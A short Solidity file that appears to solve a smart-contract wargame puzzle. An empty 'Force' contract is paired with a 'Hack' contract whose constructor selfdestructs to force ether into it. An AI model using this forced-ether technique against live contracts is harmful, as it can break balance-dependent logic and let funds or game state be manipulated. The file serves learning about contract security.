// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract Hack {
    constructor(address payable _target) payable {
        require(msg.value > 0, "send value");
        selfdestruct(_target);
    }
}
